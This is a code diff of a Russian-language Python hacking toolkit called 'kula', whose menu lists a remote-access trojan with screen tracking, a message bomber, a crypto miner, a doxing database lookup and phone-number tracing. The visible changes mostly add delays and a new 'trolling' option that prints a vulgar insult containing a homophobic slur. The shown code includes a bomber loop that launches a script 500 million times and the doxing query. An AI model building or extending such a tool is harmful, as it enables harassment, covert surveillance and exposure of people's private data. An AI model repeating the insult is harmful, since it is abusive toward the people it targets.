@@ -16,11 +16,11 @@ print(Fore.GREEN + """
 | приложений   [6] - рат без запуска приложений, но с отслеживанием экрана                            |
 | [7] - информация о себе   [8] - vpn   [9] - информация о инструменте   [10] - бомбер сообщениями    |
 | [11] - установить библиотеку если через pip install не получается   [12] - майнер   [13] -          |
-| cоздать окно   [14] - windows cmd(например если у вас линукс)   [15] - поиск по номеру  [16] - выход|
-|                                                                                                     |
+| cоздать окно   [14] - windows cmd(например если у вас линукс)   [15] - поиск по номеру  [16] -      |
+| троллинг   [17] - выход                                                                             |
 |_____________________________________________________________________________________________________|
       """)
-num = input("введите номер функции: ")
+num = input("[?] введите номер функции: ")
 if num == "1":
     import webbrowser
     print(Fore.GREEN + """
@@ -48,6 +48,7 @@ if num == "1":
         webbrowser.open(url)
 elif num == "2":
     import sqlite3
+    import time
     conn = sqlite3.connect(r"C:\Users\User\Downloads\doxkit.db")
     cursor = conn.cursor()
 
@@ -63,8 +64,12 @@ elif num == "2":
         print("Найден(ы):")
         for совпадение in совпадения:
             print(совпадение)
+            time.sleep(10)
+            print
     else:
         print("Совпадений не найдено")
+        time.sleep(10)
+        print
 
 elif num == "3":
     import http.client
@@ -536,7 +541,8 @@ finally:
     client_socket.close()
     cv2.destroyAllWindows() """)
     print("нужны библиотеки pyautogui, open-cv, numpy")
-
+    time.sleep(10)
+    print
 elif num == "7":
     import platform
     import os
@@ -557,13 +563,17 @@ elif num == "7":
     print(f"Имя компьютера: {node}")
     print(f"Имя пользователя: {user_name}")
     print(f"Модель машины: {machine}")
+    time.sleep(10)
     print("hello world")
 elif num == "8":
     import os
     os.system('start ADGuardVPN.exe')
 elif num == "9":
+    import time
     print("название: kula")
     print("создатель: k9gy")
+    time.sleep(10)
+    print
 elif num == "10":
     for i in range(500000000):
         os.system('wscript space_test.vbs')
@@ -615,12 +625,13 @@ elif num == "13":
 elif num == "14":
     import os
     os.system('cmd')
-elif num == "16":
+elif num == "17":
     import sys
     sys.exit()
 elif num == "15":
     import phonenumbers
     from phonenumbers import geocoder, carrier, NumberParseException
+    import time
 
     def analyze_phone_number(number, default_region='RU'):
         try:
@@ -645,6 +656,13 @@ elif num == "15":
     phone_input = input("Введите номер телефона: ")
     result = analyze_phone_number(phone_input)
     print(result)
+    time.sleep(10)
+    print
 
+elif num == "16":
+    import time
+    print("ты мрахота тупая будешь впитывать сои оскорбления как твоя мать еду с холодильника блять пидр ты ебучий у которого семьи нету олух")
+    time.sleep(10)
+    print
 else:
-    print("не известная команда!")
+    print("[?]не известная команда!")
